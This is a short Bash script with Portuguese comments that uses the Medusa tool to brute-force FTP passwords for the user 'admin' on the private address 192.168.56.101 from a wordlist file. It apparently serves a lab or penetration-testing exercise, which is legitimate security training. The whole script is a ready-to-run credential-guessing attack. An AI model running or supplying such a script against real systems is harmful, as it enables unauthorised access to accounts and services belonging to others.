#!/bin/bash

# Alvo e credenciais
TARGET="192.168.56.101"
USER="admin"
WORDLIST="wordlist.txt"

# Verifica se o Medusa está instalado
if ! command -v medusa &> /dev/null; then
    echo "Medusa não está instalado. Instale com: sudo apt install medusa"
    exit 1
fi

# Executa o ataque
echo "[*] Iniciando ataque de força bruta em FTP..."
medusa -h $TARGET -u $USER -P $WORDLIST -M ftp -n 21 -f

echo "[*] Ataque finalizado."